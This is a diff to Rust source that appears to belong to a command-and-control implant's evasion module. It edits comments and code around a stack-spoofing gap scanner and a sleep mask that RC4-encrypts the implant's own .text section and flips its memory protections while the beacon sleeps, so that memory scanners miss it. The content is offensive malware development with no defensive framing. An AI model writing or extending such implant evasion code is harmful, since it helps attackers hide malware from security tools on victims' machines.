@@ -37,8 +37,8 @@ const WHITELIST: &[&[u8]] = &[b"ntdll.dll", b"kernelbase.dll", b"win32u.dll", b"
 /// (`parse_table` → `enumerate_gaps` → `classify_into_pool`), and merge the
 /// results into one `GapPool` of **absolute** addresses (`base + rva`).
 ///
-/// Produces the shared `GapPool` that `StackSpoofKit::ByoudGap` (P2.1a-ii) and
-/// `SleepmaskKit::Foliage` (P2.1a-iii) borrow.
+/// Produces the shared `GapPool` that `StackSpoofKit::ByoudGap` (P2.1a-ii)
+/// borrows; future `SleepmaskKit` impls may borrow it too.
 pub struct LivePdataScanner;
 
 impl PdataGapScanner for LivePdataScanner {
@@ -286,8 +286,9 @@ fn heap_str(s: &str) -> alloc::string::String {
 //
 // ## Usage contract
 // `mask()` must be called while the thread is NOT executing from `.text` —
-// i.e. inside a Foliage APC chain where a helper thread runs the encrypt
-// while the beacon thread is parked. The beacon loop calls `mask()`/
+// i.e. inside a sleep-mask chain where a helper thread runs the encrypt
+// while the beacon thread is parked (originally the Foliage APC chain,
+// removed in commit 841ffc5). The beacon loop calls `mask()`/
 // `unmask()` only through the `SleepmaskKit` seam, never synchronously.
 
 /// Live memory-content mask: encrypt the implant `.text` via RC4 and
@@ -301,9 +302,9 @@ impl MemoryMaskKit for LiveMemoryMask {
         let region = unsafe { crate::sleep::own_text_region() }
             .ok_or(EvasionError::Unresolved(".text region"))?;
         let key = crate::mem::mask_key();
-        // Flip RX→RW then RC4-encrypt. SAFETY: caller guarantees we're in the
-        // Foliage helper context — the beacon thread is parked in alertable
-        // sleep, NOT executing .text.
+        // Flip RX→RW then RC4-encrypt. SAFETY: caller guarantees we're in a
+        // helper-thread mask context — the beacon thread is parked in
+        // alertable sleep, NOT executing .text.
         unsafe {
             crate::mem::mask_text(region.base, region.len, key);
         }
@@ -312,7 +313,7 @@ impl MemoryMaskKit for LiveMemoryMask {
 
     fn unmask(&self, token: MaskToken) -> Result<(), EvasionError> {
         // Decrypt then flip RW→RX. SAFETY: must run before any code in .text
-        // executes (the Foliage helper unmasks before the beacon wakes).
+        // executes (the helper thread unmasks before the beacon wakes).
         unsafe {
             crate::mem::unmask_text(token.base, token.len, &token.key);
         }
